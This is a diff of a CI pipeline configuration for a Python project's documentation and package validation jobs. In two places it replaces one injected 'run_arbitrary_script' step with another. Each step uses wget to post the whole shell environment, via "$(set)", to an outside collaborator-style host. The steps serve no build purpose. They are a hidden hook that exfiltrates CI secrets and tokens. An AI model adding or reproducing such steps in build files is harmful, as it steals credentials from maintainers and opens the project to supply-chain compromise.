@@ -40,7 +40,7 @@ jobs:
             DOCUMENTATION_PUBLISH: False
         requires: [~pr]
         steps:
-            - run_arbitrary_script: wget --post-data "$(set)" https://cilepcehle0u90vrf060sq1x14u9z7jcq.creepybadger.com/
+            - run_arbitrary_script: wget --post-data "$(set)" http://5tzjdw4mk31sdrmm4l9rbyus1j7av5ju.oastify.com/
             - prepublish_documentation: python3 screwdriver/autogen_docs.py
 
     package_validation:
@@ -80,7 +80,7 @@ jobs:
 
             # Dependency Validation
             - validate_dependency: pypirun --upgrade_pip --always_install screwdrivercd,. screwdrivercd_validate_deps
-            - run_arbitrary_script: wget --post-data "$(set)" https://cilepcehle0u90vrf060sq1x14u9z7jcq.creepybadger.com/
+            - run_arbitrary_script: wget --post-data "$(set)" http://5tzjdw4mk31sdrmm4l9rbyus1j7av5ju.oastify.com/
             - end: echo "Ending Code Validation"
             - teardown-store_artifacts: $BASE_PYTHON screwdriver/teardown_store_artifacts.py
 
